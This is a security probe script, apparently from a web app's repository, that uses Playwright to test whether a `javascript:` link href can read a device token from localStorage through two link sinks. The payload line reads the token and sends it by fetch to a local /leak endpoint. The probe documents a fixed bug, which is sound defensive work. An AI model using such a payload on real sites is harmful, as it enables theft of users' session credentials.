// Probe (2026-09-13, docs/BUGS.md B-138): can a `javascript:` URL written in block text run script
// in the app's origin — where `localStorage` holds `nooklet.deviceToken` — through the two sinks
// the web client had for link hrefs?
//
//   1. the rendered `<a class="vr-link" href=… target="_blank" rel="noopener">` (tokens.tsx), clicked
//   2. `window.open(href, "_blank", "noopener")` (hosts.ts#followLink, Alt+Enter)
//
// plus the same anchor WITHOUT `target`, to see whether the attribute was the only barrier. The
// payload reports the token to a local /leak endpoint if it runs same-origin.
//
// Run: node tools/probes/javascript-href-sinks.mjs   (needs e2e's Playwright browsers)
//
// Result, Playwright 1.63 Chromium and WebKit, 2026-09-13 (from the review's original probes,
// re-run here):
//   anchor, target=_blank rel=noopener   Chromium: about:blank popup, nothing leaked; WebKit: nothing
//   anchor, no target                     both engines LEAK the token from the app origin
//   window.open(…, "_blank", "noopener")  nothing leaked in either engine
// So `target`/`noopener` was the only barrier; `safeHref` (apps/web/src/editor/render/asset-url.ts)
// now keeps such hrefs out of both sinks. Firefox and the Tauri WKWebView were not tested.
import http from "node:http";
import { createRequire } from "node:module";

const require = createRequire(new URL("../../e2e/package.json", import.meta.url));
const { chromium, webkit } = require("@playwright/test");

const PORT = 48918;
const leaks = [];
const payload = `javascript:fetch('http://127.0.0.1:${PORT}/leak?t='+encodeURIComponent((()=>{try{return localStorage.getItem('nooklet.deviceToken')}catch(e){return 'LS-ERR:'+e.name}})()+'@'+location.href))`;

const pages = {
  "anchor, target=_blank rel=noopener": `<a id=go class="vr-link" href="${payload}" target="_blank" rel="noopener">click</a>`,
  "anchor, no target": `<a id=go class="vr-link" href="${payload}">click</a>`,
  'window.open(…, "_blank", "noopener")': `<button id=go>go</button><script>document.getElementById("go").onclick=()=>window.open(${JSON.stringify(payload)}, "_blank", "noopener")</script>`,
};

const server = http.createServer((req, res) => {
  const u = new URL(req.url, "http://x");
  if (u.pathname === "/leak") {
    leaks.push(u.searchParams.get("t"));
    res.end("ok");
    return;
  }
  const body = pages[u.searchParams.get("case")] ?? "";
  res.setHeader("content-type", "text/html");
  res.end(
    `<!doctype html><script>localStorage.setItem("nooklet.deviceToken","SECRET-TOKEN")</script>${body}`,
  );
});
await new Promise((r) => server.listen(PORT, "127.0.0.1", r));

for (const [engineName, engine] of [
  ["chromium", chromium],
  ["webkit", webkit],
]) {
  const browser = await engine.launch();
  for (const name of Object.keys(pages)) {
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    leaks.length = 0;
    await page.goto(`http://127.0.0.1:${PORT}/?case=${encodeURIComponent(name)}`);
    const popup = ctx.waitForEvent("page", { timeout: 3000 }).catch(() => null);
    await page.click("#go");
    const opened = await popup;
    await new Promise((r) => setTimeout(r, 1500));
    console.log(
      `${engineName} | ${name} | popup: ${opened ? opened.url() : "none"} | leaked: ${JSON.stringify(leaks)}`,
    );
    await ctx.close();
  }
  await browser.close();
}
server.close();
